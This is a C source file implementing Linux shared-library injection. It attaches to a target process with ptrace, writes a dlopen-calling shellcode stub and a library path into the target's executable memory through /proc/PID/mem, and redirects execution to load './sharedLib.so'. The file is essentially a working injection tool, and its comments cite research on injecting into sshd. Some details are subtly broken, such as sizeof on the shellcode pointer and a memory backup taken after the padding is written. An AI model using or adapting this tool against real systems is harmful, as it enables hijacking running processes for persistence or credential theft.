#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdint.h>
#include <signal.h>
#include <linux/limits.h>

// This code based on some references: https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
//                                     https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/
//                                     https://dee-dee.fr/2020/04/10/shared-library-injection-into-a-linux-process-part-1/

char *shellCode = "\x90\x90" // NOP NOP
                  "\xFF\xD0" // call *%rax
                  "\xCC";    // int3

unsigned long long findLibrary(const char *libName, pid_t pid)
{
    char mapsPath[PATH_MAX];
    FILE *mapsFile;
    char line[512];
    unsigned long long addr = 0;

    if (pid == -1)
    {
        snprintf(mapsPath, sizeof(mapsPath), "/proc/self/maps");
    }
    else
    {
        snprintf(mapsPath, sizeof(mapsPath), "/proc/%d/maps", pid);
    }

    mapsFile = fopen(mapsPath, "r");
    if (!mapsFile)
    {
        printf("Failed to open %s\n", mapsPath);
        return 0;
    }

    while (fgets(line, sizeof(line), mapsFile))
    {
        if (strstr(line, libName))
        {
            addr = strtoul(line, NULL, 16);
            break;
        }
    }

    fclose(mapsFile);
    return addr;
}

void *findMemoryRegion(pid_t pid)
{
    char mapsPath[PATH_MAX];
    FILE *mapsFile;
    char line[512];
    char perms[5];
    void *addr;

    sprintf(mapsPath, "/proc/%d/maps", pid);
    if ((mapsFile = fopen(mapsPath, "r")) == NULL)
    {
        printf("Failed to open %s\n", mapsPath);
        exit(1);
    }

    while (fgets(line, sizeof(line), mapsFile) != NULL)
    {
        sscanf(line, "%lx-%*lx %4s %*s %*s %*s", &addr, perms);

        if (strstr(perms, "x") != NULL)
        {
            fclose(mapsFile);
            return addr;
        }
    }

    fclose(mapsFile);
    return NULL;
}

void readMemory(pid_t pid, unsigned long long addr, void *buffer, size_t len)
{
    char mapsFile[PATH_MAX];
    snprintf(mapsFile, sizeof(mapsFile), "/proc/%d/mem", pid);

    // Open the memory file
    FILE *memFile = fopen(mapsFile, "r");
    fseek(memFile, addr, SEEK_SET);

    // Read the memory into the buffer
    if (fread(buffer, sizeof(char), len, memFile) != len)
    {
        printf("Failed to read memory\n");
        exit(1);
    }
    fclose(memFile);
}

void writeMemory(pid_t pid, unsigned long long addr, const char *payload, size_t len)
{
    char mapsFile[PATH_MAX];
    snprintf(mapsFile, sizeof(mapsFile), "/proc/%d/mem", pid);

    // Open the memory file
    FILE *memFile = fopen(mapsFile, "w+");
    fseek(memFile, addr, SEEK_SET);

    // Write the payload to the memory
    fwrite(payload, sizeof(char), len, memFile);

    fclose(memFile);
}

void inject(pid_t pid, void *dlopenAddr)
{
    struct user_regs_struct oldregs, regs;
    int status;
    unsigned char *oldcode;
    void *freeaddr;
    int x;

    // attach to the target process
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
    {
        perror("ptrace attach");
        exit(1);
    }
    // wait for the target process to stop
    waitpid(pid, &status, WUNTRACED);

    // back up current registers values
    ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
    memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

    // find a memory region to write code
    freeaddr = (void *)findMemoryRegion(pid);

    // calculate overwrite buffer size
    const char *filename = "./sharedLib.so";
    size_t filenameLen = strlen(filename) + 1; // +1 for null terminator
    size_t alignment = 16;                     // 16-byte alignment
    uintptr_t base = (uintptr_t)freeaddr;
    size_t padding = (alignment - ((base + filenameLen) % alignment)) % alignment; // calculate padding for alignment
    size_t stubSize = sizeof(shellCode);
    size_t total = filenameLen + padding + stubSize;

    // add NOP sled for alignment if needed
    void *padAddr = (void *)(base + filenameLen);
    if (padding > 0)
    {
        unsigned char *nops = (unsigned char *)malloc(padding);
        memset(nops, 0x90, padding);
        writeMemory(pid, (unsigned long long)padAddr, (char *)nops, padding);
        free(nops);
    }

    // back up original section of memory
    oldcode = (unsigned char *)malloc(total);
    readMemory(pid, (unsigned long long)freeaddr, oldcode, total);

    // set up values for registers
    writeMemory(pid, (unsigned long long)freeaddr, filename, filenameLen);
    writeMemory(pid, (unsigned long long)freeaddr + filenameLen, shellCode, stubSize);

    // Set up some registers
    regs.rip = (unsigned long long)freeaddr + filenameLen + 2;
    regs.rax = (unsigned long long)dlopenAddr;
    regs.rdi = (unsigned long long)freeaddr;
    regs.rsi = 2;

    // write modified registers to the target process
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    // continue execution of the target process
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, &status, WUNTRACED);

    // check if the process stopped due to 0x03 (SIGTRAP)
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP)
    {
        // get register values
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        // check if dlopen returned a valid address
        if (regs.rax != 0x0)
        {
            printf("Injected library loaded at address %p\n", (void *)regs.rax);
        }
        else
        {
            printf("Library could not be injected\n");
            return;
        }

        // restore original code
        writeMemory(pid, (unsigned long long)freeaddr, (char *)oldcode, total);

        // set back original registers
        ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);

        // resume the target process
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

        // clean up
        free(oldcode);
    }
    else
    {
        printf("Process did not stop with SIGTRAP\n");
        exit(1);
    }
}

int main(int argc, char *argv[])
{
    void *dlopenAddr = NULL;
    void *libdlAddr = NULL;
    unsigned long long dlopenOffset;

    // Load libdl.so library
    libdlAddr = dlopen("libc.so.6", RTLD_LAZY);
    if (!libdlAddr)
    {
        fprintf(stderr, "Failed to open libdl: %s\n", dlerror());
        return -1;
    }

    // Get the address of dlopen symbol
    dlopenAddr = dlsym(libdlAddr, "dlopen");
    if (!dlopenAddr)
    {
        fprintf(stderr, "Failed to find dlopen: %s\n", dlerror());
        return -1;
    }

    // Find the base address of libc in the local process
    unsigned long long localLib = findLibrary("libc.so.6", -1);

    // Find the base address of libc in the target process
    pid_t targetPid = atoi(argv[1]);
    unsigned long long remoteLib = findLibrary("libc", targetPid);

    // Calculate the address of dlopen in the target process
    dlopenAddr = remoteLib + (dlopenAddr - localLib);
    printf("dlopen address in target process: %p\n", dlopenAddr);

    inject(targetPid, dlopenAddr);
    return 0;
}